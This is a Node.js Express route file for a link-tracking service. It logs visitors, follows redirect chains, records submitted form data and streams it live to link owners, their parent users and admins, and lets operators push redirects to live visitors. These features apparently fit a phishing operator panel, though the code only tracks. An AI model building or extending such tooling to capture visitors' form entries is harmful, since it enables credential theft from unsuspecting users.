// ============================================================
// MEGA TOOLS — DATA TRACKING ROUTES (Public + Admin)
// FIX: heartbeat passes status to Session.upsert for fast Offline
// ============================================================

const express = require('express');
const router = express.Router();
const db = require('../database');
const Session = require('../models/Session');
const Link = require('../models/Link');
const User = require('../models/User');
const { ROLES } = require('../models/roles');
const { authenticate } = require('../middleware/auth');
const { toStringId, parseTrackingCode, now } = require('../utils/helpers');

// ============================================================
// HELPERS
// ============================================================

async function findLinkBySlug(slug) {
  if (!slug) return null;
  const all = await db.links.read();
  return all.find(l => l.baseCode === slug || l.slug === slug || l.uniqueCode === slug) || null;
}

async function findUserByTrackingCode(code) {
  if (!code) return null;
  const all = await db.users.read();
  return all.find(u => u.trackingCode === code) || null;
}

async function getChainTargetUrl(link, identity, actionCode) {
  if (!link || !link.is_chain || !link.chain_links?.length) {
    return { url: link?.baseUrl || 'about:blank', chainStep: null, chainStepName: '' };
  }
  if (actionCode) {
    const stepIndex = link.chain_links.findIndex(cl => cl.actionCode === actionCode);
    if (stepIndex >= 0) {
      return { url: link.chain_links[stepIndex].url, chainStep: stepIndex, chainStepName: link.chain_links[stepIndex].name || '' };
    }
  }
  const nextUrl = await Link.getNextChainUrl(link, identity);
  return { url: nextUrl?.url || link.chain_links[0].url, chainStep: nextUrl?.index ?? 0, chainStepName: nextUrl?.name || link.chain_links[0].name || '' };
}

function buildSessionDelta(session, type) {
  return {
    type, timestamp: new Date().toISOString(),
    session: {
      _id: session._id, visitorId: session.visitorId, trackingCode: session.trackingCode,
      isLive: session.isLive, status: session.status || 'Online', lastActivity: session.lastActivity,
      clicks: session.clicks, submissions: session.submissions, deviceType: session.deviceType,
      baseCode: session.baseCode, entryUrl: session.entryUrl, currentUrl: session.currentUrl,
      ip: session.ip, browser: session.browser, formData: session.formData,
      redirectHistory: session.redirectHistory || [],
      lastCommand: session.lastCommand, lastCommandUrl: session.lastCommandUrl, commandSeq: session.commandSeq,
    },
  };
}

async function emitSessionEvents(io, session, isNew, link) {
  if (!io) return;
  io.emit('sessionDelta', buildSessionDelta(session, isNew ? 'new' : 'updated'));
  const notifiedUsers = new Set();
  const allUsers = await db.users.read();
  const visitorUser = allUsers.find(u => u.trackingCode === session.trackingCode);
  if (visitorUser) {
    const userId = toStringId(visitorUser._id);
    if (!notifiedUsers.has(userId)) { io.to('user_' + userId).emit('newSession', session); notifiedUsers.add(userId); }
    if (visitorUser.parentId && !notifiedUsers.has(visitorUser.parentId)) { io.to('user_' + visitorUser.parentId).emit('newSession', session); notifiedUsers.add(visitorUser.parentId); }
  }
  allUsers.filter(u => u.role === 'admin').forEach(admin => {
    const adminId = toStringId(admin._id);
    if (!notifiedUsers.has(adminId)) { io.to('user_' + adminId).emit('newSession', session); notifiedUsers.add(adminId); }
  });
  if (link && isNew) { await Link.incrementClicks(link._id); }
}

function getClientIdentity(req) {
  return {
    visitorId: req.body.visitorId || req.query.visitorId || req.query.vid || null,
    ip: req.body.ip || req.ip || '::1'
  };
}

// ============================================================
// SMART REDIRECT (GET /:code)
// ============================================================

router.get('/:code', async (req, res) => {
  try {
    const { code } = req.params;
    const { visitorId, ip } = getClientIdentity(req);
    const ua = req.headers['user-agent'] || '';
    const { trackingCode, slug, actionCode } = parseTrackingCode(code);
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = trackingCode || link?.ownerTrackingCode || code;
    const baseCode = slug || code;
    let targetUrl = link?.baseUrl || 'about:blank'; let chainStep = null; let chainStepName = '';
    const identity = visitorId || ip;
    if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, identity, actionCode); targetUrl = chainResult.url; chainStep = chainResult.chainStep; chainStepName = chainResult.chainStepName; }
    const { session, isNew } = await Session.upsert({ visitorId, baseCode, trackingCode: finalTrackingCode, linkId: link ? toStringId(link._id) : null, ip, browser: ua.substring(0, 500), deviceType: /mobile/i.test(ua) ? 'Mobile' : 'Desktop', entryUrl: baseCode, currentUrl: code, collectedTypes: ['visit'], chainId: link?.is_chain ? toStringId(link._id) : null, chainStep, chainStepName });
    const io = req.app.get('io'); await emitSessionEvents(io, session, isNew, link);
    res.json({ success: true, session, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false, redirectDelay: 1000 });
  } catch (err) { console.error('[Data] GET /:code error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// CLICK TRACKING
// ============================================================

router.get('/click/:code', async (req, res) => {
  try {
    const { visitorId, ip } = getClientIdentity(req);
    const ua = req.headers['user-agent'] || '';
    const { trackingCode, slug, actionCode } = parseTrackingCode(req.params.code);
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = trackingCode || link?.ownerTrackingCode || req.params.code;
    const baseCode = slug || req.params.code;
    let targetUrl = link?.baseUrl || 'about:blank'; let chainStep = null; let chainStepName = '';
    const identity = visitorId || ip;
    if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, identity, actionCode); targetUrl = chainResult.url; chainStep = chainResult.chainStep; chainStepName = chainResult.chainStepName; }
    const { session, isNew } = await Session.upsert({ visitorId, baseCode, trackingCode: finalTrackingCode, linkId: link ? toStringId(link._id) : null, ip, browser: ua.substring(0, 500), deviceType: /mobile/i.test(ua) ? 'Mobile' : 'Desktop', entryUrl: baseCode, currentUrl: req.params.code, collectedTypes: ['click'], chainId: link?.is_chain ? toStringId(link._id) : null, chainStep, chainStepName });
    const io = req.app.get('io'); await emitSessionEvents(io, session, isNew, link);
    res.json({ success: true, session, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false });
  } catch (err) { console.error('[Data] Click error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// CHECK REDIRECT
// ============================================================

router.get('/check-redirect/:code', async (req, res) => {
  try {
    const { code } = req.params;
    const { visitorId, ip } = getClientIdentity(req);
    const { trackingCode, slug } = parseTrackingCode(code);
    const all = await db.sessions.read(); let session = null;
    if (visitorId) session = all.find(s => s.visitorId === visitorId && s.isLive);
    if (!session && trackingCode) session = all.find(s => s.trackingCode === trackingCode && s.isLive);
    if (session) { const link = await findLinkBySlug(slug); let redirectUrl = session.currentUrl || link?.baseUrl || ''; if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, visitorId || ip, null); redirectUrl = chainResult.url; } res.json({ success: true, redirectUrl, session, message: session.lastMessage || '' }); }
    else { res.json({ success: false, redirectUrl: null, message: null }); }
  } catch (err) { console.error('[Data] Check redirect error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// VISIT (POST)
// ============================================================

router.post('/visit', async (req, res) => {
  try {
    const { trackingCode, browser, device, collectedTypes } = req.body;
    const { visitorId, ip } = getClientIdentity(req);
    const { trackingCode: parsedTC, slug, actionCode } = parseTrackingCode(trackingCode || '');
    const link = await findLinkBySlug(slug); const finalTrackingCode = parsedTC || trackingCode || 'unknown';
    const baseCode = slug || trackingCode || 'direct_visit';
    let targetUrl = link?.baseUrl || ''; let chainStep = null; let chainStepName = '';
    const identity = visitorId || ip;
    if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, identity, actionCode); targetUrl = chainResult.url; chainStep = chainResult.chainStep; chainStepName = chainResult.chainStepName; }
    const { session, isNew } = await Session.upsert({ visitorId, baseCode, trackingCode: finalTrackingCode, linkId: link ? toStringId(link._id) : null, ip, browser: browser || '', deviceType: device || 'Desktop', entryUrl: baseCode, currentUrl: trackingCode || '', collectedTypes: collectedTypes || ['visit'], chainId: link?.is_chain ? toStringId(link._id) : null, chainStep, chainStepName });
    const io = req.app.get('io'); await emitSessionEvents(io, session, isNew, link);
    res.json({ success: true, session, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false });
  } catch (err) { console.error('[Data] Visit error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// FORM SUBMIT — UPDATE ONLY
// ============================================================

router.post('/submit', async (req, res) => {
  try {
    const { formData, trackingCode, collectedTypes, browser, device } = req.body;
    const { visitorId, ip } = getClientIdentity(req);
    if (!formData) return res.status(400).json({ success: false, message: 'formData required' });
    const { trackingCode: parsedTC, slug } = parseTrackingCode(trackingCode || '');
    const link = await findLinkBySlug(slug); const finalTrackingCode = parsedTC || trackingCode || 'direct';
    const baseCode = slug || trackingCode || 'direct_submit';
    const enrichedFormData = { ...formData, submittedAt: now() };
    const { session, isNew } = await Session.upsert({ visitorId, baseCode, trackingCode: finalTrackingCode, linkId: link ? toStringId(link._id) : null, ip, browser: browser || 'Unknown', deviceType: device || 'Desktop', entryUrl: baseCode, currentUrl: trackingCode || '', collectedTypes: [...(collectedTypes || []), 'form_submit'], chainId: link?.is_chain ? toStringId(link._id) : null, formData: enrichedFormData });
    const io = req.app.get('io');
    if (io) {
      io.emit('sessionDelta', buildSessionDelta(session, isNew ? 'new' : 'updated'));
      io.emit('formSubmitted', { visitorId: session.visitorId, sessionId: session._id, formData: enrichedFormData, timestamp: now() });
    }
    res.json({ success: true, message: 'Form submitted', session, totalSubmissions: session.submissions?.length || 1 });
  } catch (err) { console.error('[Data] Submit error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// HEARTBEAT — ✅ Passes status to Session.upsert for fast Offline
// ============================================================

router.post('/heartbeat', async (req, res) => {
  try {
    const { trackingCode, browser, device, status } = req.body;
    const { visitorId, ip } = getClientIdentity(req);

    // ✅ Pass status so Session.upsert can set isLive=false for Offline
    const { session } = await Session.upsert({
      visitorId: visitorId || null,
      trackingCode: trackingCode || '',
      baseCode: trackingCode || '',
      ip,
      browser: browser || '',
      deviceType: device || 'Desktop',
      collectedTypes: ['heartbeat'],
      status: status || undefined  // ✅ 'Active' or 'Offline' from beforeunload
    });

    res.json({ success: true, isLive: session?.isLive, status: session?.status, lastActivity: session?.lastActivity });
  } catch (err) { console.error('[Data] Heartbeat error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// SESSION DETAILS
// ============================================================

router.get('/session/:visitorId', async (req, res) => {
  try {
    const session = await Session.findByVisitorId(req.params.visitorId);
    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
    res.json({ success: true, session });
  } catch (err) { console.error('[Data] Session error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// EXPORT
// ============================================================

module.exports = router;